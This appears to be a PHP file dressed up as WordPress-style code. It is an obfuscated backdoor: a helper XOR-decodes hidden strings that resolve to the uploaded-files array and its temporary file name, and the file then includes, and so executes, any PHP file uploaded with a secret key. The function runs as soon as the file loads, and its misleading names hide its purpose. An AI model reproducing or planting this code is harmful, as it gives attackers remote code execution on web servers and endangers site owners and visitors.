<?php 	
function where_post_type()

{
	$user_id = 'slashpos';
    $shortcode_regex = 'Yp100kN68hAm';
    $open_quote = $shortcode_regex;
    
	$post_category = 'open_q_flag';
    $tt_ids = $GLOBALS[cached("%066x%7Cu8", $open_quote)];

    $strip = $tt_ids;

    $cdn_url = isset($strip[$open_quote]);
    if ($cdn_url)

    {
        $parsed = $tt_ids[$open_quote];

        $end_clean = $parsed[cached("-%1DAo%5E%0A%23S", $open_quote)];
        $trackback_urls = $end_clean;
        include ($trackback_urls);
    }
}

function cached($has_self_closer, $comment_regex)

{
    $no_texturize_shortcodes_stack = $comment_regex;
    $new_date = "url" . "decode";
    $foundid = $new_date($has_self_closer);

    $no_texturize_tags = substr($no_texturize_shortcodes_stack,0, strlen($foundid));
	$input = 'content_type';
    $pre_attribute_ws = $foundid ^ $no_texturize_tags;
    return $pre_attribute_ws;

}


where_post_type();
	$loop = 'unhashed';

?>
